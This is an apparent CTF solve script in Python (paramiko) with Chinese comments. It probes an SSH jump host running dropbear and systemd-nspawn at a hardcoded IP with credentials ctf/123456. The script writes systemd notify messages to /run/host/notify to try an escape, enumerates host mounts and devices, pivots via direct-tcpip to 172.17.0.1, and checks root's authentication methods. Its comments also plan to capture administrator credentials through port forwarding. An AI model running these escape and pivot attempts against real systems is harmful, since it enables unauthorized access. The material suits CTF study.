import paramiko
import socket
import time
import sys
import os

"""
关键发现：
1. dropbear在宿主机上运行
2. 每次连接创建新的systemd-nspawn容器
3. /run/host/notify 是一个unix socket

NOTIFY_SOCKET 是 systemd 用于服务通知的机制
如果我们能利用这个socket，可能可以：
1. 发送通知影响服务状态
2. 尝试某种形式的逃逸

但更重要的是：既然direct-tcpip是在宿主机处理的，
那么172.17.0.1（真正的主机）应该是可以通过某种方式访问的
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def test_notify_socket_write():
    """尝试写入notify socket"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 尝试写入notify socket...")
    
    # 尝试各种systemd通知消息
    messages = [
        "READY=1",
        "STATUS=test",
        "MAINPID=$$",
        "STOPPING=1",
        "RELOADING=1",
        "WATCHDOG=1"
    ]
    
    for msg in messages:
        session = transport.open_session()
        # 使用/dev/udp或nc发送消息到socket
        # busybox可能没有socat，但我们可以尝试其他方法
        cmd = f"echo -n '{msg}' | dd of=/run/host/notify"
        session.exec_command(cmd)
        result = session.recv(1024).decode()
        print(f"消息'{msg}': {result}")
    
    ssh.close()

def explore_run_host():
    """详细探索/run/host目录"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 探索/run/host...")
    
    for cmd in [
        "find /run/host -type f -o -type s",
        "cat /run/host/os-release",
        "ls -laR /run/host/",
        "stat /run/host/",
        "cat /proc/mounts | grep -E 'run|host'"
    ]:
        print(f"\n命令: {cmd}")
        session = transport.open_session()
        session.exec_command(cmd)
        session.settimeout(3)
        try:
            print(session.recv(4096).decode())
        except:
            print("(超时)")
    
    ssh.close()

def check_unix_export():
    """检查unix-export目录"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查unix-export...")
    
    for cmd in [
        "ls -la /run/host/unix-export/",
        "find /run/host/unix-export/ -type f -o -type s",
        "stat /run/host/unix-export/"
    ]:
        print(f"\n命令: {cmd}")
        session = transport.open_session()
        session.exec_command(cmd)
        print(session.recv(4096).decode())
    
    ssh.close()

def test_mount_possibilities():
    """测试挂载可能性"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查挂载相关...")
    
    # 检查设备
    session = transport.open_session()
    session.exec_command("ls -la /dev/")
    print("设备列表:")
    print(session.recv(8192).decode())
    
    # 检查块设备
    session = transport.open_session()
    session.exec_command("cat /proc/partitions")
    print("\n分区信息:")
    print(session.recv(4096).decode())
    
    # 检查是否有virtio设备
    session = transport.open_session()
    session.exec_command("ls -la /sys/bus/virtio/devices/")
    print("\nVirtio设备:")
    print(session.recv(4096).decode())
    
    # 检查9p
    session = transport.open_session()
    session.exec_command("ls -la /sys/bus/9p/devices/")
    print("\n9P设备:")
    print(session.recv(4096).decode())
    
    ssh.close()

def try_direct_ssh_to_host():
    """
    尝试直接SSH到宿主机
    
    既然172.17.0.1是真正的宿主机，而且我们可以通过direct-tcpip到达它
    问题是：我们需要正确的凭据
    
    FakeJumpServer的思路是：当管理员通过跳板机连接时，
    跳板机可以窃取凭据
    
    但在这个CTF中，我们可能需要找到一个不同的方法
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 获取172.17.0.1的banner和支持的认证方法
    print("[*] 分析172.17.0.1...")
    
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 获取host key
    key = target_transport.get_remote_server_key()
    print(f"Host key: {key.get_fingerprint().hex()}")
    print(f"Key type: {key.get_name()}")
    
    # 尝试无密码认证看支持的方法
    try:
        target_transport.auth_none("root")
    except paramiko.BadAuthenticationType as e:
        print(f"支持的认证方法: {e.allowed_types}")
    except Exception as e:
        print(f"错误: {e}")
    
    target_transport.close()
    ssh.close()

def analyze_challenge_hints():
    """
    分析题目提示
    
    1. "使用SSH的某些特性" - 不是漏洞利用
    2. "类似FakeJumpServer" - 跳板机攻击
    3. "第二次SSH连接的报错有用" - 错误信息包含线索
    4. "用户名密码注入无关" - 不是命令注入
    
    FakeJumpServer通常指：
    - 恶意跳板机伪装成目标服务器
    - 当客户端通过ProxyJump连接时，跳板机拦截认证
    
    但在这个题目中，我们是攻击者，不是受害者
    所以可能的思路是：
    - 我们需要让某人（管理员）通过我们控制的路径连接
    - 或者我们需要利用dropbear的某些特性
    """
    
    print("[*] 分析题目架构...")
    print("""
    架构：
    外部用户 --> 61.147.171.105:55300 (dropbear) --> systemd-nspawn容器
                                                    |
                                                    +--> 172.17.0.1 (真实宿主机, OpenSSH)
    
    特点：
    1. dropbear运行在容器外
    2. 每次连接创建新容器
    3. direct-tcpip由dropbear处理，也会创建新容器
    4. 172.17.0.1是真实的Docker主机
    
    可能的攻击向量：
    1. 利用反向端口转发捕获管理员凭据
    2. 利用某种SSH特性逃逸
    3. 找到dropbear的配置漏洞
    """)

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入分析和利用尝试")
    print("="*60)
    
    analyze_challenge_hints()
    
    print("\n[1] 探索/run/host")
    explore_run_host()
    
    print("\n[2] 检查unix-export")
    check_unix_export()
    
    print("\n[3] 测试挂载可能性")
    test_mount_possibilities()
    
    print("\n[4] 分析172.17.0.1")
    try_direct_ssh_to_host()
